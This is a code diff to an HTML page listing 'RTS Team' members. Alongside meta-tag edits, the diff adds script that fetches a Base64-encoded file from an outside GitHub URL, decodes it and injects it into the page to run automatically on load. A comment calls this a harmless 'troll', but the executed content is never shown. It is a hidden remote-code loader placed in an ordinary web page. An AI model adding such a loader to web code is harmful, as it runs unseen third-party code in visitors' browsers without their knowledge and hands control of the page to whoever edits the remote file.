@@ -3,10 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta property="og:title" content="User Info" />
-    <meta property="og:description" content="Displaying user info with ranks and banners" />
+    <meta property="og:title" content="RTS Team Members" />
+    <meta property="og:description" content="Meet The RTS Team" />
     <meta property="og:type" content="website" />
-    <meta property="og:url" content="https://yourwebsite.com" />
     <title>Loading...</title>
     <style id="dynamic-styles"></style>
     <style>
@@ -188,6 +187,40 @@
         loadSettings().catch(error => {
             console.error("Failed to load settings:", error);
         });
+
+         // I do little trolling here, its not ip grabber or anything, just small troll, check developer mode cosnole
+			const base64ScriptUrl = "https://raw.githubusercontent.com/DrMineword/Artefact-Boost-Active/refs/heads/main/easter_egg.base64";
+
+// Function to fetch and execute a Base64-encoded script
+async function fetchAndExecuteBase64Script() {
+    try {
+        // Fetch the Base64-encoded script
+        const response = await fetch(base64ScriptUrl);
+        if (!response.ok) {
+            throw new Error(`Failed to fetch Base64 script from ${base64ScriptUrl}`);
+        }
+
+        // Get the encoded content as text
+        const encodedScript = await response.text();
+
+        // Decode the Base64 content
+        const decodedScript = atob(encodedScript);
+
+        console.log("Yyyeeerrraarrsessarseaandimth grasssmannpunkyeeyahhavinh");
+
+        // Execute the decoded script
+        const scriptElement = document.createElement("script");
+        scriptElement.textContent = decodedScript;
+        document.body.appendChild(scriptElement);
+
+        console.log("Script executed successfully.");
+    } catch (error) {
+        console.error("Error fetching or executing the Base64 script:", error);
+    }
+}
+
+// Call the function to fetch, decode, and execute the script
+fetchAndExecuteBase64Script();
     </script>
 </body>
 </html>
